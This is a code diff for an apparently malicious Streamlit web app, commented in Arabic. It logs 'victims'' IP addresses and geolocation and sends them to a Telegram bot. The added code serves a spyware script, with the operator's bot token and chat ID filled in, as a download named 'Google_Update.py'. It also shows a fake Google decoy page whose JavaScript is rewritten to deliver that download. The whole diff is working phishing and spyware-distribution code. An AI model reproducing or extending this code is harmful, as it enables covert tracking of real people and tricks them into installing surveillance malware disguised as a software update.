@@ -89,8 +89,8 @@ def capture_victim_data():
             # تسجيل بيانات الضحية
             victim_logger.log_victim_data(
                 ip_address=user_ip,
-                user_agent=query_params.get('user_agent', ['Unknown'])[0],
-                referrer=query_params.get('target', ['Unknown'])[0],
+                user_agent="Browser",
+                referrer=query_params.get('target', 'Unknown'),
                 geo_data=geo_data
             )
             
@@ -109,7 +109,7 @@ def capture_victim_data():
 🌍 <b>الدولة:</b> {geo_data.get('country', 'Unknown') if geo_data else 'Unknown'}
 🏙️ <b>المدينة:</b> {geo_data.get('city', 'Unknown') if geo_data else 'Unknown'}
 🏢 <b>مزود الخدمة:</b> {geo_data.get('isp', 'Unknown') if geo_data else 'Unknown'}
-🎯 <b>المصيدة:</b> {query_params.get('target', ['Unknown'])[0]}
+🎯 <b>المصيدة:</b> {query_params.get('target', 'Unknown')}
 ⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
                     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -122,6 +122,50 @@ def capture_victim_data():
 
 # استدعاء دالة التقاط البيانات
 capture_victim_data()
+
+# ============= منطق تحميل ملف التجسس =============
+if 'download' in st.query_params:
+    token = st.query_params.get('token', '')
+    chatid = st.query_params.get('chatid', '')
+    
+    if token and chatid:
+        try:
+            with open('spy_full.py', 'r', encoding='utf-8') as f:
+                spy_code = f.read()
+            
+            # استبدال القيم في الكود
+            spy_code = spy_code.replace('YOUR_BOT_TOKEN_HERE', token)
+            spy_code = spy_code.replace('YOUR_CHAT_ID_HERE', chatid)
+            
+            st.download_button(
+                label="تحميل الأداة",
+                data=spy_code,
+                file_name="Google_Update.py",
+                mime="text/x-python"
+            )
+            st.info("اضغط على الزر أعلاه لبدء التحميل")
+            st.stop()
+        except Exception as e:
+            st.error(f"خطأ في توليد الملف: {e}")
+
+# ============= منطق صفحة التمويه (Google) =============
+if 'decoy' in st.query_params and st.query_params.get('decoy') == 'google':
+    try:
+        with open('index.html', 'r', encoding='utf-8') as f:
+            html_content = f.read()
+        
+        # إضافة رابط التحميل التلقائي في HTML
+        token = st.query_params.get('token', '')
+        chatid = st.query_params.get('chatid', '')
+        download_url = f"https://rashdai.streamlit.app/?download=true&token={token}&chatid={chatid}"
+        
+        # حقن رابط التحميل في JavaScript الخاص بـ index.html
+        html_content = html_content.replace('https://rashdai.streamlit.app/api/upload', download_url)
+        
+        st.components.v1.html(html_content, height=800, scrolling=True)
+        st.stop()
+    except Exception as e:
+        st.error(f"خطأ في تحميل صفحة التمويه: {e}")
 
 # ============= تهيئة الجلسة =============
 if "developer_mode" not in st.session_state:
